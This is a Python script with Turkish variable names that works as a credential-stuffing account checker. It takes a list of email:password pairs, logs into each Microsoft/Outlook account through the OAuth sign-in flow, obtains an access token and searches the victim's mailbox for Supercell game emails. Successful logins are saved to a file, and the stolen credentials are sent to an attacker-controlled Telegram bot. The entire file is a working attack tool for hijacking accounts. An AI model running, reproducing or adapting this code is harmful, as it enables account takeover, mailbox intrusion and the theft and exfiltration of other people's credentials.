import requests
import json
import re
import os
from urllib.parse import quote
from colorama import Fore, Style, init

init(autoreset=True)

telegram_bot_token = input("TOKEN TELE: ")
telegram_chat_id = input("ID TELE: ")

def layznxw7():
    while True:
        yol = input("Combo Yolu: ")
        if os.path.isfile(yol):
            return yol
        print("Dosya bulunamadı. Lütfen geçerli bir dosya yolu gir.")

def telegrama_gonder(mesaj):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {
        'chat_id': telegram_chat_id,
        'text': mesaj,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, data=data)
    except:
        pass

def main():
    SweetzieSchick = layznxw7()
    with open(SweetzieSchick, 'r', encoding='utf-8', errors='ignore') as f:
        kombineler = f.readlines()
    JesusChrist = requests.Session()
    JesusChrist.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'tr-TR',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    })
    for kombo in kombineler:
        if ':' not in kombo:
            continue
        mail, sifre = kombo.strip().split(':', 1)
        print(f"{Fore.CYAN}Kontrol ediliyor: {mail}")
        try:
            url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(mail)}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=tr&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            cevap = JesusChrist.get(url)
            if 'IfExistsResult\":1' in cevap.text:
                print(f"{Fore.RED}Hesap bulunamadı")
                continue
            PPFT = re.search(r'name="PPFT" id="i0327" value="(.*?)"', cevap.text)
            if not PPFT:
                print("PPFT alınamadı")
                continue
            PPFT = PPFT.group(1)
            urlpost = re.search(r"urlPost:'(.*?)'", cevap.text)
            if not urlpost:
                print("urlPost alınamadı")
                continue
            urlpost = urlpost.group(1)
            veri = {
                'i13': '1',
                'login': mail,
                'loginfmt': mail,
                'type': '11',
                'LoginOptions': '1',
                'passwd': sifre,
                'ps': '2',
                'PPFT': PPFT,
                'PPSX': 'Passport',
                'NewUser': '1',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '0',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i19': '3772'
            }
            cevap2 = JesusChrist.post(urlpost, data=veri, allow_redirects=False)
            if 'https://login.live.com/ppsecure/post.srf' not in cevap2.text and 'Location' not in cevap2.headers:
                print(f"{Fore.RED}Giriş başarısız")
                continue
            if 'Location' in cevap2.headers:
                kod = re.search(r'code=(.*?)&', cevap2.headers['Location'])
                if not kod:
                    print("Kod alınamadı")
                    continue
                kod = kod.group(1)
                tokenverisi = {
                    'client_info': '1',
                    'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
                    'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
                    'grant_type': 'authorization_code',
                    'code': kod,
                    'scope': 'profile openid offline_access https://outlook.office.com/M365.Access'
                }
                basliklar = {
                    'Host': 'login.microsoftonline.com',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
                    'User-Agent': 'Mozilla/5.0 (compatible; MSAL 1.0)',
                    'x-client-Ver': '1.0.0+635e350c',
                    'x-client-OS': '28',
                    'x-client-SKU': 'MSAL.xplat.android',
                }
                cevap3 = JesusChrist.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', data=tokenverisi, headers=basliklar)
                if 'access_token' not in cevap3.text:
                    print("Token alınamadı")
                    continue
                token = cevap3.json()['access_token']
                cid = ''
                for c in JesusChrist.cookies:
                    if c.name == 'MSPCID':
                        cid = c.value.upper()
                        break
                mailbaslik = {
                    'User-Agent': 'Outlook-Android/2.0',
                    'Authorization': f'Bearer {token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
                veri = {
                    "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "Turkey Standard Time",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {
                            "Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                            ]
                        },
                        "From": 0,
                        "Query": {"QueryString": "noreply@id.supercell.com"},
                        "Size": 25,
                        "Sort": [
                            {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                            {"Field": "Time", "SortDirection": "Desc"}
                        ],
                        "EnableTopResults": True,
                        "TopResultsCount": 3
                    }],
                    "AnswerEntityRequests": [{
                        "Query": {"QueryString": "noreply@id.supercell.com"},
                        "EntityTypes": ["Event", "File"],
                        "From": 0,
                        "Size": 10,
                        "EnableAsyncResolution": True
                    }],
                    "QueryAlterationOptions": {
                        "EnableSuggestion": True,
                        "EnableAlteration": True,
                        "SupportedRecourseDisplayTypes": [
                            "Suggestion",
                            "NoResultModification",
                            "NoResultFolderRefinerModification",
                            "NoRequeryModification",
                            "Modification"
                        ]
                    },
                    "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
                }
                cevap4 = JesusChrist.post('https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124', json=veri, headers=mailbaslik)
                veritext = json.dumps(cevap4.json())
                oyunlar = {
                    'Clash Royale': '✔️' if 'Clash Royale' in veritext else '❌',
                    'Brawl Stars': '✔️' if 'Brawl Stars' in veritext else '❌',
                    'Clash of Clans': '✔️' if 'Clash of Clans' in veritext else '❌',
                    'Hay Day': '✔️' if 'Hay Day' in veritext else '❌'
                }
                sonuc = f"{mail}:{sifre} | Clash Royale: {oyunlar['Clash Royale']} | Brawl Stars: {oyunlar['Brawl Stars']} | Clash of Clans: {oyunlar['Clash of Clans']} | Hay Day: {oyunlar['Hay Day']}"
                if any(deger == '✔️' for deger in oyunlar.values()):
                    print(f"{Fore.GREEN}[HIT] {sonuc}")
                    with open("SUPERCELL_hits.txt", "a", encoding="utf-8") as dosya:
                        dosya.write(sonuc + "\n")
                    telegrama_gonder(sonuc)
                else:
                    print(f"{Fore.YELLOW}[GİRİŞ VAR AMA BAĞLI OYUN YOK] {sonuc}")
        except Exception as e:
            print(f"{Fore.RED}Hata: {str(e)}")
            continue

if __name__ == "__main__":
    main()